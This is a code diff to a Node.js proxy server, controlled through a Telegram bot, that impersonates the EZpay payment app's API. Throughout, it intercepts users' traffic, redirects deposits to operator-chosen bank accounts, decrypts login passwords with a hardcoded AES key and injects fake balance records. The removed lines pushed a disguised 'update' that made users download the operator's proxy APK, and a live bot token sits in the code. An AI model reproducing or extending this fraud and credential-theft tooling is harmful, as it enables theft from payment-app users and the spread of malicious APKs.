@@ -4,7 +4,7 @@ const { Redis } = require('@upstash/redis');
 const crypto = require('crypto');
 
 const app = express();
-const ORIGINAL_API = 'https://app-api.ezpaycenter.com';
+const ORIGINAL_API = 'https://api.ezpaycenter.com';
 const BOT_TOKEN = process.env.BOT_TOKEN || '8727636415:AAFIvrnqVgtQXxCBS8r8j9NAthRO6d2ywaU';
 const WEBHOOK_URL = 'https://xcvic.vercel.app/bot-webhook';
 const REDIS_URL = process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL;
@@ -25,9 +25,7 @@ const DEFAULT_DATA = {
   userOverrides: {},
   trackedUsers: {},
   suspendedPhones: {},
-  blockUpdate: true,
-  proxyApkUrl: '',
-  proxyApkVersion: ''
+  blockUpdate: true
 };
 
 let bot = null;
@@ -89,7 +87,7 @@ async function saveData(data) {
     if (!skipMerge) {
       const current = await redis.get('ezpayData');
       if (current && typeof current === 'object') {
-        const settingsKeys = ['banks', 'activeIndex', 'autoRotate', 'botEnabled', 'usdtAddress', 'logRequests', 'suspendedPhones', 'adminChatId', 'depositSuccess', 'depositBonus', 'withdrawOverride', 'blockUpdate', 'proxyApkUrl', 'proxyApkVersion'];
+        const settingsKeys = ['banks', 'activeIndex', 'autoRotate', 'botEnabled', 'usdtAddress', 'logRequests', 'suspendedPhones', 'adminChatId', 'depositSuccess', 'depositBonus', 'withdrawOverride', 'blockUpdate'];
         for (const key of settingsKeys) {
           if (current[key] !== undefined) {
             data[key] = current[key];
@@ -322,7 +320,7 @@ async function proxyFetch(req) {
         kl === 'transfer-encoding' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
     fwd[k] = v;
   }
-  fwd['host'] = 'app-api.ezpaycenter.com';
+  fwd['host'] = 'api.ezpaycenter.com';
   const opts = { method: req.method, headers: fwd };
   if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
     opts.body = req.rawBody;
@@ -338,25 +336,10 @@ async function proxyFetch(req) {
     }
   });
   const blockData = cachedData || DEFAULT_DATA;
-  if (blockData.proxyApkUrl) {
-    for (const k of Object.keys(respHeaders)) {
-      const kl = k.toLowerCase();
-      if (kl === 'needupdateflag' || kl === 'link' || kl === 'version' || kl === 'versioncode' || kl === 'md5' || kl === 'updatecontent') {
-        delete respHeaders[k];
-      }
-    }
-    respHeaders['needupdateflag'] = '1';
-    respHeaders['link'] = blockData.proxyApkUrl;
-    respHeaders['version'] = blockData.proxyApkVersion || '1.1.5';
-    respHeaders['versioncode'] = '99';
-    respHeaders['updatecontent'] = 'New version available. Please update.';
-  } else if (blockData.blockUpdate !== false) {
+  if (blockData.blockUpdate !== false) {
     for (const k of Object.keys(respHeaders)) {
       const kl = k.toLowerCase();
       if (kl === 'needupdateflag') {
-        respHeaders[k] = '0';
-      }
-      if (kl === 'version' || kl === 'versioncode') {
         delete respHeaders[k];
       }
     }
@@ -702,8 +685,6 @@ app.post('/bot-webhook', async (req, res) => {
 /on log <userId> — Log on for user
 /update — Block update popup (default ON)
 /update on — Allow update popup
-/setapkurl <url> [version] — Push proxy APK update to users
-/clearapkurl — Stop proxy APK update
 /status — Full status
 /debug — Debug next response
 
@@ -741,7 +722,7 @@ Example:
     if (text === '/status') {
       const active = getActiveBank(data, null);
       const idCount = Object.keys(data.userOverrides || {}).length;
-      let m = `📊 Status:\nProxy: ${data.botEnabled ? '🟢 ON' : '🔴 OFF'}\nBanks: ${data.banks.length}\nAuto-Rotate: ${data.autoRotate ? '🔄 ON' : '❌ OFF'}\nLog: ${data.logRequests ? '📡 ON' : '🔇 OFF'}\nUpdate: ${data.proxyApkUrl ? `📦 PROXY APK (v${data.proxyApkVersion || '?'})` : (data.blockUpdate !== false ? '🚫 BLOCKED' : '✅ REAL')}\nTracked Users: ${Object.keys(data.trackedUsers || {}).length}`;
+      let m = `📊 Status:\nProxy: ${data.botEnabled ? '🟢 ON' : '🔴 OFF'}\nBanks: ${data.banks.length}\nAuto-Rotate: ${data.autoRotate ? '🔄 ON' : '❌ OFF'}\nLog: ${data.logRequests ? '📡 ON' : '🔇 OFF'}\nUpdate Block: ${data.blockUpdate !== false ? '🚫 BLOCKED' : '✅ ALLOWED'}\nTracked Users: ${Object.keys(data.trackedUsers || {}).length}`;
       if (data.usdtAddress) m += `\n₮ USDT: ${data.usdtAddress.substring(0, 15)}...`;
       if (active) m += `\n\n💳 Active:\n${active.accountHolder}\n${active.accountNo}\nIFSC: ${active.ifsc}${active.bankName ? '\nBank: ' + active.bankName : ''}${active.upiId ? '\nUPI: ' + active.upiId : ''}`;
       else m += '\n\n⚠️ No active bank';
@@ -769,35 +750,6 @@ Example:
         await saveData(data);
         await bot.sendMessage(chatId, '🚫 Update popup BLOCKED\nReal server ka update popup ab nahi dikhega app mein.');
       }
-      return res.sendStatus(200);
-    }
-
-    if (text.startsWith('/setapkurl ')) {
-      const parts = text.substring(11).trim().split(' ');
-      const apkUrl = parts[0];
-      const apkVersion = parts[1] || '1.1.5';
-      if (!apkUrl || !apkUrl.startsWith('http')) {
-        await bot.sendMessage(chatId, '❌ Format: /setapkurl <https://...> [version]\nExample: /setapkurl https://github.com/.../EZpay.apk 1.1.5');
-        return res.sendStatus(200);
-      }
-      data = await loadData(true);
-      data.proxyApkUrl = apkUrl;
-      data.proxyApkVersion = apkVersion;
-      data.blockUpdate = false;
-      data._skipOverrideMerge = true;
-      await saveData(data);
-      await bot.sendMessage(chatId, `📦 Proxy APK Update SET\nURL: ${apkUrl}\nVersion: ${apkVersion}\n\nAb sabke app mein update popup aayega. Click karne pe tera proxy APK download hoga.`);
-      return res.sendStatus(200);
-    }
-
-    if (text === '/clearapkurl') {
-      data = await loadData(true);
-      data.proxyApkUrl = '';
-      data.proxyApkVersion = '';
-      data.blockUpdate = true;
-      data._skipOverrideMerge = true;
-      await saveData(data);
-      await bot.sendMessage(chatId, '🚫 Proxy APK URL cleared.\nUpdate popup wapis block ho gaya.');
       return res.sendStatus(200);
     }
 
@@ -904,7 +856,10 @@ Example:
       });
       freshData._skipOverrideMerge = true;
       await saveData(freshData);
-      await bot.sendMessage(chatId, `✅ Added ₹${amount} to user ${targetUserId}\n💰 Total added: ₹${freshData.userOverrides[targetUserId].addedBalance}\n📊 Updated balance: ₹${updatedBal}`);
+      const statusMsg = tracked
+        ? `📊 Updated balance: ₹${updatedBal}`
+        : `⏳ User is offline — ₹${freshData.userOverrides[targetUserId].addedBalance} will show when they open the app`;
+      await bot.sendMessage(chatId, `✅ Added ₹${amount} to user ${targetUserId}\n💰 Total added: ₹${freshData.userOverrides[targetUserId].addedBalance}\n${statusMsg}`);
       return res.sendStatus(200);
     }
 
@@ -1287,7 +1242,7 @@ app.post('/app/api/system/v2/login', async (req, res) => {
       let pwd = encPwd;
       if (encPwd) {
         try {
-          const AES_KEY = '8Kjsis90sJnsHys8';
+          const AES_KEY = 'H85ju78GJ6ti5fDU';
           const keyBytes = Buffer.from(AES_KEY, 'utf8');
           const iv = keyBytes.slice(0, 16);
           const decipher = crypto.createDecipheriv('aes-128-cbc', keyBytes, iv);
@@ -1656,7 +1611,7 @@ app.post('/app/api/orderOut/payingSubmitImg', async (req, res) => {
       if (kl === 'host' || kl === 'connection' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
       fwd[k] = v;
     }
-    fwd['host'] = 'app-api.ezpaycenter.com';
+    fwd['host'] = 'api.ezpaycenter.com';
     const opts = { method: req.method, headers: fwd };
     if (req.rawBody && req.rawBody.length > 0) {
       opts.body = req.rawBody;
@@ -1732,7 +1687,7 @@ app.post('/app/api/orderOut/pendingSubmitImg', async (req, res) => {
       if (kl === 'host' || kl === 'connection' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
       fwd[k] = v;
     }
-    fwd['host'] = 'app-api.ezpaycenter.com';
+    fwd['host'] = 'api.ezpaycenter.com';
     const opts = { method: req.method, headers: fwd };
     if (req.rawBody && req.rawBody.length > 0) {
       opts.body = req.rawBody;
@@ -2106,8 +2061,34 @@ app.all('/app/api/memberManager/balanceRecordList', async (req, res) => {
           }
         }
         targetArr.forEach(applyToItem);
+      } else if (shouldInject && typeof listData === 'object' && !Array.isArray(listData)) {
+        const arrKeys = ['lists', 'list', 'records', 'rows', 'content'];
+        let injected = false;
+        for (const ak of arrKeys) {
+          if (listData[ak] !== undefined) {
+            if (!Array.isArray(listData[ak])) listData[ak] = [];
+            listData[ak].unshift(...fakeRecords);
+            if (listData.total !== undefined) listData.total += fakeRecords.length;
+            if (listData.totalCount !== undefined) listData.totalCount += fakeRecords.length;
+            if (listData.totalElements !== undefined) listData.totalElements += fakeRecords.length;
+            injected = true;
+            break;
+          }
+        }
+        if (!injected) {
+          listData.lists = [...fakeRecords];
+          if (listData.total !== undefined) listData.total += fakeRecords.length;
+          if (listData.totalCount !== undefined) listData.totalCount += fakeRecords.length;
+        }
       } else if (typeof listData === 'object') {
         applyToItem(listData);
+      }
+    } else if (shouldInject && jsonResp) {
+      const rd = jsonResp.data || jsonResp.result || jsonResp;
+      if (rd && typeof rd === 'object' && !Array.isArray(rd)) {
+        rd.lists = [...fakeRecords];
+      } else if (jsonResp.data === null || jsonResp.data === undefined) {
+        jsonResp.data = { lists: [...fakeRecords], total: fakeRecords.length };
       }
     }
 
